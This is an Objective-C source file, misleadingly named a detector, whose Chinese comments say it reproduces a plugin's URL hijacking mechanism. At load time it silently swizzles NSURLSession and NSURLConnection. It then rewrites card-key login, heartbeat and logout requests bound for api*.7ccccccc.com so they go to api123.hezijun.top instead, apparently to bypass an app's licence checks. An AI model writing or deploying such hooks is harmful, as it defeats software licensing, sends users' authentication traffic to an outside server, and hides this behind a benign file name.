// URLHijackDetector.m
// 完全复现原插件的 URL 劫持机制
#import <Foundation/Foundation.h>
#import <objc/runtime.h>

#pragma mark - NSObject Category（与原插件完全一致）

@interface NSObject (hook)
@end

@implementation NSObject (hook)

// +load 方法在 dyld 加载时自动执行，比 main() 更早
+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        [self performMethodSwizzling];
    });
}

#pragma mark - 配置区（从原插件加密数据解密后的结果）

// 需要匹配的目标 URL（原插件通过 isEqualToString: 精确匹配）
static NSSet<NSString *> *getTargetURLs(void) {
    return [NSSet setWithArray:@[
        // api1
        @"http://api1.7ccccccc.com/v1/card/login",
        @"http://api1.7ccccccc.com/v1/card/heartbeat",
        @"http://api1.7ccccccc.com/v1/card/logout",
        // api2
        @"http://api2.7ccccccc.com/v1/card/login",
        @"http://api2.7ccccccc.com/v1/card/heartbeat",
        @"http://api2.7ccccccc.com/v1/card/logout",
        // api3
        @"http://api3.7ccccccc.com/v1/card/login",
        @"http://api3.7ccccccc.com/v1/card/heartbeat",
        @"http://api3.7ccccccc.com/v1/card/logout"
    ]];
}

// 劫持后替换的新域名
static NSString *getNewDomain(void) {
    return @"api123.hezijun.top";
}

#pragma mark - URL 匹配与替换（复现 isEqualToString: + setURL:）

static NSString* matchAndReplaceURL(NSString *originalURLString) {
    // 原插件的匹配方式：isEqualToString: 精确匹配
    if ([getTargetURLs() containsObject:originalURLString]) {
        // 提取路径
        NSURL *url = [NSURL URLWithString:originalURLString];
        NSString *path = url.path;
        NSString *scheme = url.scheme ?: @"http";
        // 构造新 URL
        return [NSString stringWithFormat:@"%@://%@%@", scheme, getNewDomain(), path];
    }
    return originalURLString;
}

#pragma mark - Method Swizzling（复现原插件的 Hook 机制）

+ (void)performMethodSwizzling {
    // Hook NSURLSession（原插件主要目标）
    [self swizzleNSURLSession];
    // Hook NSURLConnection（备份，原插件也 Hook 了这个）
    [self swizzleNSURLConnection];
}

+ (void)swizzleNSURLSession {
    Class class = [NSURLSession class];
    
    SEL originalSelector = @selector(dataTaskWithRequest:completionHandler:);
    SEL swizzledSelector = @selector(replaced_dataTaskWithRequest:completionHandler:);
    
    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    
    if (!originalMethod) return;
    
    // 动态添加 swizzled 方法
    __block id replacementBlock = ^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
        return [self replaced_dataTaskWithRequest:request completionHandler:completionHandler];
    };
    
    class_addMethod(class, swizzledSelector, imp_implementationWithBlock(replacementBlock), "@@:@?");
    
    Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
    
    if (originalMethod && swizzledMethod) {
        method_exchangeImplementations(originalMethod, swizzledMethod);
    }
}

// 替换后的方法（相当于原插件的 ___replaced_dataTaskWithRequest_CompletionHandler_block_invoke + sub_8D14）
- (NSURLSessionDataTask *)replaced_dataTaskWithRequest:(NSURLRequest *)request 
                                      completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    
    NSString *originalURLString = request.URL.absoluteString;
    
    // 步骤1: isEqualToString: 匹配目标 URL
    NSString *newURLString = matchAndReplaceURL(originalURLString);
    
    // 步骤2: 如果匹配成功，执行劫持
    if (![newURLString isEqualToString:originalURLString]) {
        // 步骤3: [request mutableCopy]
        NSMutableURLRequest *mutableRequest = [request mutableCopy];
        
        // 步骤4: [NSURL URLWithString:新URL]
        NSURL *newURL = [NSURL URLWithString:newURLString];
        
        // 步骤5: [mutableRequest setURL:新URL]
        [mutableRequest setURL:newURL];
        
        // 步骤6: 调用原始方法发送劫持后的请求
        return [self replaced_dataTaskWithRequest:mutableRequest completionHandler:completionHandler];
    }
    
    // 未匹配，直接调用原始方法
    return [self replaced_dataTaskWithRequest:request completionHandler:completionHandler];
}

#pragma mark - NSURLConnection Hook（备份，与原插件一致）

+ (void)swizzleNSURLConnection {
    Class class = objc_getClass("NSURLConnection");
    if (!class) return;
    
    SEL originalSelector = @selector(sendAsynchronousRequest:queue:completionHandler:);
    Method originalMethod = class_getClassMethod(class, originalSelector);
    
    if (!originalMethod) return;
    
    IMP originalImp = method_getImplementation(originalMethod);
    
    IMP newImp = imp_implementationWithBlock(^(id _self, NSURLRequest *request, NSOperationQueue *queue, void (^handler)(NSURLResponse*, NSData*, NSError*)) {
        NSString *newURLString = matchAndReplaceURL(request.URL.absoluteString);
        
        if (![newURLString isEqualToString:request.URL.absoluteString]) {
            NSMutableURLRequest *newRequest = [request mutableCopy];
            [newRequest setURL:[NSURL URLWithString:newURLString]];
            request = newRequest;
        }
        
        void (*originalFunc)(id, SEL, NSURLRequest*, NSOperationQueue*, void (^)(NSURLResponse*, NSData*, NSError*));
        originalFunc = (void *)originalImp;
        originalFunc(_self, originalSelector, request, queue, handler);
    });
    
    class_replaceMethod(class, originalSelector, newImp, method_getTypeEncoding(originalMethod));
}

@end

// 构造函数入口（确保加载）
__attribute__((constructor))
static void initialize() {
    // 静默加载，无日志输出
}
